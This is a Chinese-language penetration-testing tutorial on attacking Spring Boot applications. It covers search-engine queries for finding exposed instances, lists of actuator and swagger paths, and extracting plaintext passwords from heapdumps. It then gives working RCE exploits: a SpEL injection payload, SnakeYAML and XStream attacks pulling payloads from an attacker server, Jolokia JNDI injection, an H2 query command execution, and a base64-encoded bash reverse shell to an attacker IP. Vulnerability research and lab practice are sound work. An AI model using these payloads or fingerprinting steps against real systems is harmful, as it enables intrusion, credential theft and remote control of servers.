Spring是一个java开源框架，可以接管web层、业务层、dao层、持久层的组件，其核心就是控制反转(IOC)和面向切面(AOP)。Spring框架有众多衍生产品如boot、security、jpa等。SpringBoot本身并不提供Spring框架的核心特性以及扩展功能，它消除了设置Spring应用程序所需的XML配置，大大降低了项目搭建的复杂度，内置了Tomcat容器同时集成了大量常用的第三方库配置(例如Jackson、Redis、Mongo等)，Springboot应用中这些第三方库几乎可以零配置的开箱即用(out-of-the-box)，可用于快速、敏捷地开发新一代基于Spring框架的应用程序。

0x01信息收集
========

1.1 识别
------

① 默认图标  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5e2c4fdfc313931436656f2814da85b145f4888d.png)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6f70ac2b9ccea937fb3efad61b22d71a59e99eaf.png)  
不过在2.2.x以后移除了绿叶标。  
② 默认报错页面  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-26d78fcb8c3eadf1fc8590e97eb3c93bcfd30631.png)  
③ 搜索语法识别  
FOFA语法：`app="spring"`  
Zoomeye语法：`app:"spring-boot"`  
Google语法：`app="spring-boot"`  
④ Wappalyer插件等识别  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-dbc918f92338d09b352da6940c64ae8cf8a3032e.png)  
⑤ 看报文标头  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-8635830e6b86db05e84fa88dc7717fd99b92da43.png)

1.2 目录泄露
--------

### 1.2.1 swagger路由

```php
/v2/api-docs
/swagger-ui.html
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
……
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-38fa0433e32f44eef1bb65d777fcf3bb9845161e.png)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d0b4f4f5515b8c982bbf1d842903b25478a808d1.png)

### 1.2.2 配置不当导致的信息泄露（包括1.x和2.x）

```php
/actuator
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/jolokia
/actuator/hystrix.stream
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
```

我们经常关注的是`/env或/actuator/env`,`/refresh或/actuator/refresh`,`/jolokia或/actuator/jolokia`,`/trace或/actuator/httptrace`，能够获取明显的利用信息或触发rce漏洞。  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-34b7a34442261ed46dbfbf0ca9d05cda6b0d0254.png)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-319fa743d569feceec4e6ba58be5627fda0a8733.png)

1.3 获取明文密码
----------

利用条件：可以GET访问`/heapdump`或`/actuator/heapdump`。  
第一步：访问`/env`或`/actuator/env`，搜索`******`。  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0f599921bfec3ef259425d9a2477de77d79846ba.png)  
第二步：访问`/heapdump`或`/actuator/heapdump`，下载 JVM 堆信息。  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fa293c3d31bcd5022014d29e0bd2d4325b7869d3.png)  
第三步：使用`jvisualvm`查询密码。  
`jvisualvm`是Java版本在1.8及1.8版本以下自带的工具，在终端运行命令`jvisualvm`即可弹出使用界面。

```php
Spring boot 1.x版本：select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())
Spring boot 2.x版本：select s.value.toString() from java.util.LinkedHashMap$Entry s where /password/.test(s.key.toString())
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-76108a2fbf955536f36ea0c4e360c03fae2f71ab.png)  
还有多种获取明文密码的方法，请见第一个参考链接。

0x02 Spring 漏洞
==============

```php
漏洞环境：https://github.com/LandGrey/SpringBootVulExploit
```

2.1 whitelabel error page SpEL RCE
----------------------------------

### 2.1.1 影响版本

`spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0`

### 2.1.2 利用条件

- 至少知道一个触发 springboot 默认错误页面的接口及参数名.

### 2.1.3 利用步骤

1. 确定一个正常传参  
    比如发现访问 `/article?id=3` ，页面会返回`3`相关内容，说明参数正常。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d1c803166053bf270c8ac6cac513f5f06d14d3e7.png)
2. 执行spl表达式  
    输入 `/article?id=${7*7}` ，如果发现报错页面将`7*7`计算出来显示`49`在报错页面上，那么可以确定目标存在 SpEL 表达式注入漏洞。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-46a7173df84578c4e7e92539c572145493135f9e.png)  
    用以下表达式可以执行`open -a Calculator`命令。 ```php
    ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))}
    ```
    
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-04f0962d8e7df0952a94cc43ba26b374de6e9061.png)
    
    ### 2.1.4 漏洞原理
    
    spring boot 处理参数值出错，报错页面是包含了一些spel表达式的，所以会对报错页面内的spel表达式进行循环查找并解析出来，从而达到了命令注入，详情函数分析见参考文章。

2.2 spring cloud SnakeYAML RCE
------------------------------

### 2.2.1 影响版本

```php
SpringBoot 2.x 无法利用; 
SpringBoot 1.5.x 在 Dalston 版本可以利用，在 Edgware 版本无法利用;  
SpringBoot &lt;=1.4 可以利用.
```

### 2.2.2 利用条件

- `/env` 接口可以POST访问；
- `/refresh` 接口可以POST刷新配置；
- `spring-cloud-starter` 版本 &lt; 1.3.0.RELEASE，存在 `spring-boot-starter-actuator` 依赖）；
- 可以访问外网。

### 2.2.3 漏洞复现

1. 准备yml和jar文件；

```php
https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce  
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e51e856217e3a98a2aa03183adcd594000aa5cca.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6c0b8ad215423d98f699e86f2e8559b1a8078c22.png)

```php
javac src/artsploit/AwesomeScriptEngineFactory.java 
jar -cvf yaml-payload.jar -C src/ .
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c9a00809f7cae61e95ea2e8e50a9459552953292.png)  
jar是要执行的文件，通过yml文件访问到jar。

2. 设置 spring.cloud.bootstrap.location 属性

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a9eaab20f5742da591e4ab9b5efe50ef3118851c.png)

```php
spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/yaml-payload.yml
```

```php
spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/yaml.payload.yml"}
```

3. 刷新配置，触发代码执行。

```php
spring 1.x
POST /refresh

Content-Type: application/x-www-form-urlencoded
```

```php
spring 2.x
POST /actuator/refresh

Content-Type: application/json
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-96876f59cae22641b6edcc5a325c193639e1f1dd.png)

### 2.2.4 漏洞原理

通过设置`spring.cloud.bootstrap.location` 引入外部链接，访问`refresh`接口触发rce。

2.3 eureka xstream deserialization RCE
--------------------------------------

### 2.3.1 影响版本

```php
eureka-client<1.8.7
```

### 2.3.2 利用条件

- `/env` 接口可以POST访问；
- `/refresh` 接口可以POST刷新配置；
- 可以访问外网。

### 2.3.3 漏洞复现并开启监听

1. 架设xstream网站；  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e39a08417bb8cb1b2c910822999f4596b644bdfd.png)
2. 访问`/env`设置eureka.client.serviceUrl.defaultZone 属性；

```php
spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

```php
spring 2.x

POST /actuator/refresh
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/xstream"}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-586621bf2d371a1ed8661874fc565c155858f789.png)

3. 访问`/refresh`,触发rce；

```php
spring 1.x

POST /refresh
Content-Type: application/x-www-form-urlencoded
```

```php
spring 2.x

POST /actuator/refresh
Content-Type: application/json
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1f19fa6cc6402729270031f6a0280570cb3f05bf.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0654d1327291c125319bcca76d4ae58b04393062.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ac9188e0c73be10d8e96f6cf5b4e0e3477e7d4e4.png)

### 2.3.4 漏洞原理

通过对`/env`设置`eureka.client.serviceUrl.defaultZone`的值引入外部恶意url，然后通过`/refresh` 刷新配置，解析url内的xstream反序列化出命令执行代码。

2.4 jolokia logback JNDI RCE
----------------------------

### 2.4.1 利用条件

- `/jolokia` 或 `/actuator/jolokia` 接口；
- `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean；
- 可以访问外网；
- JNDI 注入受目标 JDK 版本影响，jdk&lt;6u201/7u191/8u182/11.0.1（LDAP 方式）

### 2.4.2 漏洞复现

1. 开启ldap服务；  
    192.168.88.129是攻击机ip

```php
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 192.168.88.129             
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-cd648342fb6860df7761ab2fdd8a4bb6ef780d12.png)

2. 准备xml文件并开启简易服务器；

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d0db3bddd3595c8765fa66093b66bac079444151.png)

```php
 python2 -m SimpleHTTPServer 8888  
```

3. 从外部 URL 地址加载日志配置文件。

```php
http://10.188.120.107:9094/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.88.129:8888!/logback.xml
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3dfef57a7da3a544d75dc7dc7da5424c68750f09.png)

### 2.4.3 漏洞原理

请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容，再解析xml文件，请求恶意 JNDI 服务器，通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法导致 JNDI 注入，造成 RCE 漏洞。

2.5 jolokia Realm JNDI RCE
--------------------------

### 2.5.1 利用条件

- 可以直接访问`/jolokia` 或 `/actuator/jolokia` 接口
- 能确定使用了`jolokia-core` 依赖并且环境中存在相关 MBean
- 目标网站可以访问外网
- JNDI 注入受目标 JDK 版本影响，jdk&lt;6u141/7u131/8u121（RMI 方式）

### 2.5.2 漏洞复现

1. 准备xml文件和JNDIObject.java文件；

192.168.141.129为攻击机IP，3333为监听端口。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-118bf0b0e9868a89860a3fdd40ec4d9f03b07eea.png)  
使用  
`javac -source 1.5 -target 1.5 JNDIObject.java`编译JNDIObject.java文件。

2. 使用python开启建议服务器并开启监听；

```php
python2 -m SimpleHTTPServer 80
```

3. 启动JNDIObject文件；

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.141.129:80/##JNDIObject 1389
```

4. 触发rce。  
    这里需要注意jdk版本，jdk版本太高，即使请求了 JNDIObject.class，也反弹不了shell。

```php
　/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.141.129!/example.xml
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-44dade2d01307769febade7ba775faa1d6a71314.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5b0c5a6b3a0a1eea9929335e9513699ce96625b2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5917b485fac0c5ec7108c202f18a5ae463148955.png)

### 2.5.3 漏洞原理

请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容，再经过解析器解析，设置了外部 JNDI 服务器地址，导致 JNDI 注入，造成 RCE 漏洞。

2.6 h2 database query RCE
-------------------------

### 2.6.1 利用条件

- `/env` 接口可以POST设置属性
- `/restart` 接口可以POST重启应用（存在 spring-boot-starter-actuator 依赖）
- 存在 `com.h2database.h2` 依赖（版本要求暂未知）

### 2.6.2 漏洞复现

1. 设置 spring.datasource.hikari.connection-test-query 属性；

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f84f591cccdff54feb20286b52b61a835be40cfe.png)

```php
spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
```

```php
spring 2.x
POST /actuator/env  
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS **T5** AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String\[\]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
```

2. 重启应用  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-eefb380afa5b5a7ac59e69417f81591a6122aae9.png)

### 2.6.3 漏洞原理

通过访问`/actuator/env`设置`spring.datasource.hikari.connection-test-query` ，再通过`/actuator/restart`接口重启Spring Boot程序，sql语句中的自定义函数会被重新执行，触发rce。

2.7 h2 database console JNDI RCE
--------------------------------

### 2.7.1 利用条件

- 使用 `com.h2database.h2` 依赖（版本要求暂未知）；
- 启用了 `spring.h2.console.enabled=true`；
- 可以访问外网。

### 2.7.2 漏洞复现

1. 架设恶意 rmi 服务并开启监听

```php
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjEyOS8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}' -A 192.168.88.129
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-77d623f1d8a74b1f4171c2d2a8257215f7e52144.png)

2. 触发 JNDI 注入  
    `Driver Class`处固定填写`javax.naming.InitialContext`,`JDBC URL`处填rmi服务生成的链接，再点击connect监听处反弹shell。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e7bfc2f9175b58659d91f772968cae464acbec0a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ed8f10cf487126c42453218421eb4493e6c0ead2.png)

### 2.7.3 漏洞原理

请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容。

0X03 总结
-------

在实际应用中，springboot可以攻击的点远不止这些！

参考链接  
<https://github.com/LandGrey/SpringBootVulExploit>  
[https://blog.csdn.net/qq\_23936389/article/details/125870644](https://blog.csdn.net/qq_23936389/article/details/125870644)  
[https://blog.csdn.net/qq\_40519543/article/details/121403143](https://blog.csdn.net/qq_40519543/article/details/121403143)  
<https://zhuanlan.zhihu.com/p/548317500>